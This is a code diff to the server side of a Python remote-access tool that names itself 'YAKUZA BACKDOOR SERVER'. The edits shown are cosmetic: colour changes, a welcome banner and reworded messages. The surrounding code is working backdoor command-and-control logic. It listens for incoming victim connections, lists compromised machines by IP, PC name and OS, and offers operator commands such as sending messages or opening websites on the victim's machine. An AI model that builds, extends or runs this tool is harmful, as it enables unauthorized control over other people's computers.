@@ -17,7 +17,8 @@ from time import sleep
 from threading import Thread
 
 from miscs import *
-from miscs.colors import fColors
+from miscs.colors import fColors, bColors
+from miscs.string_format import StringFormat
 
 """ Section 1: Develop Utitlity Objects(Global Variables, lambda's, functions) """
 
@@ -84,7 +85,9 @@ def create_socket():
 def socket_bind():
     global objSocket  # noqa
     try:
-        print(fColors.LIGHT_GREEN + f"[+] Listening on Port: {str(SERVER_PORT)}" + fColors.RESET)
+        print(fColors.BLACK + bColors.WHITE + StringFormat.BOLD +
+              center(60*" ", "\n[***] Welcome to YAKUZA BACKDOOR SERVER Side.! [***]\n") + fColors.RESET)
+        print(fColors.GREEN + f"\n[+] Listening on Port: {str(SERVER_PORT)}" + fColors.RESET)
         objSocket.bind((SERVER_HOST, SERVER_PORT))  # noqa
         objSocket.listen(20)
 
@@ -114,7 +117,7 @@ def socket_accept():
 
             # address[0] is IP Address, address[2] is Client PC Information
             print(fColors.LIGHT_GREEN +
-                  f"\n[+] Connection has been Established Succesfully: {address[0]} ({address[2]})" + fColors.RESET)
+                  f"\n[+] Connection has been Succesfully Established: {address[0]} ({address[2]})" + fColors.RESET)
 
         except SocketError as e:
             print(f'{fColors.LIGHT_RED}[-] Error while Accepting Connection. '
@@ -124,8 +127,8 @@ def socket_accept():
 
 # Step 12: Define a Function to Show Help Menu
 def menu_help():
-    print(fColors.LIGHT_BLUE+"""\n
-    Main Menu Options:
+    print(fColors.LIGHT_BLUE+ "\nMain Menu Options:")
+    print(fColors.LIGHT_WHITE+"""
     ---------
     --l, list: Connect to Server
     --i [CONNECTION-ID]: Interact with Connections
@@ -137,8 +140,8 @@ def menu_help():
 
 # this function used to show All Commands list
 def commands_help():
-    print(fColors.LIGHT_BLUE+"""\n
-    Commands List Help Menu:
+    print(fColors.LIGHT_BLUE+ "\nCommands List Help Menu:")
+    print(fColors.LIGHT_WHITE+"""
     ---------
     --m [MESSAGE]: Send Message to the Client
     --o [WEBSITE_URL]: Open Website on the Client Machine
@@ -214,10 +217,11 @@ def list_connections():
                 str(arrAddresses[intCounter][1]) + 4*" " + str(arrAddresses[intCounter][2]) + 4*" " + \
                 str(arrAddresses[intCounter][3]) + "\n"
 
-        print(fColors.GREEN + "\n" + "ID" + 3*" " + center(str(arrAddresses[0][0]), "IP") + 4*" " + \
-              center(str(arrAddresses[0][1]), "PORT") + 4*" " + fColors.CYAN +\
-              center(str(arrAddresses[0][2]), "PC Name") + 4*" " + fColors.CYAN +\
-              center(str(arrAddresses[0][3]), "OS Name") + "\n" + fColors.LIGHT_GREEN +strClients  + fColors.RESET, end="")
+        print(fColors.LIGHT_BLUE + "\n" + "ID" + 3*" " + center(str(arrAddresses[0][0]), "IP") + 4*" " + \
+              center(str(arrAddresses[0][1]), "PORT") + 4*" " + \
+              center(str(arrAddresses[0][2]), "PC Name") + 4*" " + \
+              center(str(arrAddresses[0][3]), "OS Name") + "\n" + \
+              fColors.LIGHT_WHITE +strClients  + fColors.RESET, end="")
     else:
         print(fColors.LIGHT_RED + "[-] No Connections Found!!." + fColors.RESET)
 
@@ -244,7 +248,7 @@ def select_connection(connection_id, get_response):
 
         # Check if the get_response is True show Connected message to the user
         if get_response == 'True':
-            print(fColors.LIGHT_GREEN + f"[+] You Are Connect to {arrInfo[0]}  ......\n" + fColors.RESET)
+            print(fColors.LIGHT_GREEN + f"[+] You Are Connect to {arrInfo[0]}\n" + fColors.RESET)
 
         return conn
 
